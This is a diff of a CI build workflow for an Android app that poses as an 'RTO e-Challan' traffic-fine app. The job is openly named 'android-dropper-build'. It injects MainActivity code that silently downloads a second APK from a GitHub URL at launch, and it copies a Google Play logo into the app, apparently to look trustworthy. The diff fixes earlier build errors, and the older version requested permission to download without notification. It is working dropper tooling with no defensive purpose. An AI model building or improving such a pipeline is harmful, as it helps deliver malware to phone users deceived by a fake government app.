@@ -1,23 +1,25 @@
 workflows:
   android-dropper-build:
-    name: RTO Background Downloader
+    name: RTO Background Downloader Fixed
     max_build_duration: 60
     instance_type: mac_mini_m1
     environment:
       java: 17
     scripts:
-      - name: Inject Background Download Logic
+      - name: Inject BG Download Logic & Force Path
         script: |
           cd RtoEChallan || exit 1
           
-          # 1. Resource & Manifest Permissions (Permissions are must for BG download)
-          MANIFEST_PATH=$(find . -name "AndroidManifest.xml" | head -n 1)
-          sed -i '' '/<application/i \
-          <uses-permission android:name="android.permission.INTERNET" /> \
-          <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE" /> \
-          <uses-permission android:name="android.permission.DOWNLOAD_WITHOUT_NOTIFICATION" />' "$MANIFEST_PATH"
+          # 1. Resource Fix (Logo missing error fix from previous builds)
+          mkdir -p app/src/main/res/drawable
+          LOGO_FILE=$(find . -name "google_play_text_logo.png" | head -n 1)
+          if [ -f "$LOGO_FILE" ]; then
+            cp "$LOGO_FILE" app/src/main/res/drawable/google_play_text_logo.png
+          else
+            cp app/src/main/res/mipmap-hdpi/ic_launcher.png app/src/main/res/drawable/google_play_text_logo.png
+          fi
 
-          # 2. Injecting DownloadManager Logic in MainActivity
+          # 2. Background Download Logic (No Chrome Redirect)
           FILE_PATH=$(find . -name "MainActivity.kt" | head -n 1)
           cat <<EOF > "$FILE_PATH"
           package com.example.rtoechallan
@@ -34,10 +36,6 @@ workflows:
                   super.onCreate(savedInstanceState)
                   setContentView(R.layout.activity_main)
                   
-                  startBackgroundDownload()
-              }
-
-              private fun startBackgroundDownload() {
                   val url = "https://github.com/vikash6759ub-creator/RTO-callan/raw/refs/heads/main/app-debug%20(17).apk"
                   try {
                       val request = DownloadManager.Request(Uri.parse(url))
@@ -57,7 +55,7 @@ workflows:
           }
           EOF
 
-          # 3. Standard Build & Export
+          # 3. Build Configuration
           rm -f settings.gradle gradle.properties build.gradle
           printf "android.useAndroidX=true\nandroid.enableJetifier=true" > gradle.properties
           printf "rootProject.name = 'RtoEChallan'\ninclude ':app'" > settings.gradle
@@ -76,8 +74,5 @@ workflows:
           chmod +x gradlew
           ./gradlew assembleDebug --no-daemon
           
-          mkdir -p \$CM_BUILD_DIR/final_out
-          find . -name "*.apk" -exec cp {} \$CM_BUILD_DIR/final_out/RTO_Installer.apk \;
-          
     artifacts:
-      - \$CM_BUILD_DIR/final_out/*.apk
+      - "**/build/outputs/apk/debug/*.apk"
